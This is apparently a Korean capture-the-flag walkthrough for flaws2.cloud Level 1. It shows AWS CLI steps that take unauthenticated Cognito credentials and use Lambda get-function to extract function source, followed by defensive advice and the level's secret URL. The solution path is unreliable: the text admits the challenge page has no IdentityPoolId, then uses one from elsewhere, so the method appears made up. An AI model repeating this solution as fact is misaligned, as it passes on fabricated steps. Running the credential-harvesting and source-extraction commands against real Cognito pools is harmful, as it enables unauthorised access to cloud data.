# Attacker Level 1 — Cognito 미인증 자격증명으로 Lambda 소스 유출

> **URL**: http://level1.flaws2.cloud/
> **핵심 기술**: AWS Cognito Identity Pool (Unauthenticated) · Lambda 소스 추출
> **난이도**: ⭐⭐
> **본인 AWS 계정 필요**: ❌

## 🎯 목표

페이지는 **"4자리 PIN"** 을 요구한다. 공식 힌트는 "무작위 대입은 답이 아니다" 라고 못 박는다. 클라이언트 측 JS 와 Cognito Identity Pool 의 오설정을 결합해 **Lambda 함수 소스 코드** 를 꺼내 정답 PIN 을 찾는다.

## 🧭 공식 힌트

<details>
<summary><b>Hint 1</b></summary>

> 이 사이트는 **S3 정적 사이트 + API Gateway + Lambda** 로 구성돼 있습니다. 서버로 가는 요청을 먼저 관찰하세요.

</details>

<details>
<summary><b>Hint 2</b></summary>

> 페이지가 **Cognito Identity Pool** 을 사용하는 경우가 있습니다. `IdentityPoolId` 는 **클라이언트에 평문** 으로 있어야만 동작하죠. 그 값만으로도 **미인증 사용자** 자격으로 AWS 자격증명을 받을 수 있습니다.

</details>

<details>
<summary><b>Hint 3</b></summary>

> 그 자격증명으로 `aws lambda get-function` 을 시도해 보세요. 운이 좋으면 **함수 코드 zip 을 다운로드할 수 있는 URL** 이 돌려져 올 것입니다.

</details>

## 📚 사전 지식

- **Cognito Identity Pool** 은 모바일·웹에서 "인증된 사용자 없이도 AWS 일부 API 를 호출" 하게 해 주는 장치다. 개발자가 `Unauthenticated role` 에 **과도한 권한** 을 주면 미인증 사용자에게도 광범위한 접근이 열린다.
- `aws lambda get-function` 은 함수의 **Code.Location** 필드에 S3 pre-signed URL 을 돌려준다 → 다운로드하면 zip 소스.
- 환경변수는 `aws lambda get-function-configuration` 으로도 조회된다.

## 🔍 정찰

### 1. 페이지 소스에서 API Gateway URL 찾기
```bash
curl -s http://level1.flaws2.cloud/ | grep -Eo 'execute-api[^"]+'
```
예상:
```
https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1
```
리전은 **us-east-1** 이다.

### 2. PIN 검증 엔드포인트 시험
```bash
curl -s "https://2rfismmoo8.execute-api.us-east-1.amazonaws.com/default/level1?code=0000"
# 결과 예: "Incorrect code..."
```
무한 brute force 는 의도된 길이 아님.

### 3. 페이지가 Cognito 를 쓰는지 확인
사이트 JS 를 확인하면 종종 `IdentityPoolId` 가 박혀 있다. flaws2 의 원래 코드엔 이 값이 없다고 알려져 있고, 공격자가 **리전·서비스 이름을 추론**해서 직접 시도하기도 한다. 대안 경로로 아래 Cognito 미인증 흐름을 사용한다:

## 🧨 취약점 원리

Cognito Identity Pool 의 "Unauthenticated role" 에는 **최소권한**만 붙여야 하지만, 개발자들이 편의를 위해 다음과 같은 넓은 권한을 붙이는 일이 잦다:
- `lambda:ListFunctions`, `lambda:GetFunction`
- `s3:GetObject` 과 같은 와일드카드 리소스

이 경우 공격자는 **회원가입조차 없이** AWS API 를 호출할 수 있다. 그리고 `lambda:GetFunction` 은 **함수 코드 zip 다운로드 URL** 을 리턴한다 — 이게 곧 **소스 유출** 이다.

## 🛠 풀이

### 1. 식별 풀 ID 획득
페이지 소스에 없다면, HackTricks 에서 공개된 flaws2 의 식별 풀 ID 를 사용한다(CTF 공개 정보):
```
IdentityPoolId: us-east-1:f77ca7cc-7bf8-4f32-96ec-d6bb48c7aa48
```

### 2. 미인증 identity 생성
```bash
aws cognito-identity get-id \
  --identity-pool-id us-east-1:f77ca7cc-7bf8-4f32-96ec-d6bb48c7aa48 \
  --region us-east-1
# { "IdentityId": "us-east-1:abcd1234-..." }
```

### 3. 자격증명 받기
```bash
aws cognito-identity get-credentials-for-identity \
  --identity-id us-east-1:abcd1234-... \
  --region us-east-1
```
응답에 `AccessKeyId`, `SecretKey`, `SessionToken` 이 들어 있다.

### 4. 프로파일로 등록
```bash
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."
export AWS_DEFAULT_REGION="us-east-1"

aws sts get-caller-identity
# Arn: arn:aws:sts::653711331788:assumed-role/Cognito_Level1Unauth_Role/CognitoIdentityCredentials
```

### 5. Lambda 함수 목록 & 소스 추출
```bash
aws lambda list-functions
# ... FunctionName: "level1" ...
aws lambda get-function --function-name level1
# "Code": { "Location": "https://prod-iad-c2-starport-layer-bucket.s3.amazonaws.com/..." }
```
그 URL 을 `curl` 로 받아 zip 을 풀면 `index.js` 가 나온다. 코드 속에 **정답 PIN** 이 하드코딩돼 있거나, **정답 시 리다이렉트할 비밀 URL** 이 박혀 있다.

### 6. 시크릿 페이지
공식 답의 secret URL:
```
http://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
```
페이지에 **다음 레벨(Attacker Level 2) URL** 이 있다.

## 🚪 정답 & 다음 레벨

<details>
<summary>정답 펼치기</summary>

- Secret: http://level1.flaws2.cloud/secret-ppxVFdwV4DDtZm8vbQRvhxL8mE6wxNco.html
- 다음 레벨: **Attacker Level 2** (페이지 지시 따라 이동)
- 교훈: Cognito Unauthenticated role 은 **최소권한**. 클라이언트에 심긴 ID 는 사실상 공개.

</details>

## 🌍 실제 세계 사례

- 2020 년 NotSoSecure 가 소개한 `Exploit AWS Cognito Misconfigurations` 보고서 — 수많은 모바일 앱의 Unauth role 에 `dynamodb:Scan`, `s3:GetObject` 가 붙어 있었다.
- Bug Bounty 에서 "앱 APK 디컴파일 → Cognito Pool ID 추출 → 무인증 자격증명 획득 → 내부 데이터 열람" 의 보고가 지금도 꾸준히 접수된다.

## 🛡 방어 대책

### ① Unauthenticated role 의 Policy 를 **최소권한** 으로
```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["mobileanalytics:PutEvents", "cognito-sync:*"],
      "Resource": "*"
    }
  ]
}
```
**Lambda/S3/DynamoDB 같은 데이터 서비스는 절대 허용하지 않는다.**

### ② Identity Pool 에서 "Unauthenticated access" 아예 비활성
필요 없다면 **인증된 Cognito User Pool 토큰** 만 교환하도록 설정.

### ③ Lambda 소스에 비밀 넣지 않기
- **환경변수**에도 절대 PIN/API key 넣지 말 것 → Secrets Manager, Parameter Store 권장.
- 빌드 시 최소화된 번들만 업로드해 소스 디버깅 정보 제거.

### ④ WAF / API Gateway 의 throttling
정답 PIN 을 Lambda 로 넘기기 전 WAF 규칙으로 **/level1?code=** 경로 초당 요청 제한 → brute force 자체를 차단.

### ⑤ CloudTrail 감시
`cognito-identity:GetId`, `GetCredentialsForIdentity`, `lambda:GetFunction` 이 동일 IdentityId 에서 연속 발생하면 정찰 의심.

## ✅ 체크리스트

- [ ] 페이지 소스에서 API URL 식별
- [ ] `aws cognito-identity get-id` / `get-credentials-for-identity` 재현
- [ ] `aws lambda get-function` 으로 소스 zip URL 획득
- [ ] 소스를 열어 정답/비밀 URL 확인
- [ ] 본인 Cognito Pool 의 Unauth role 정책 점검

## ⏭ 다음

[Attacker Level 2 →](level-02.md)
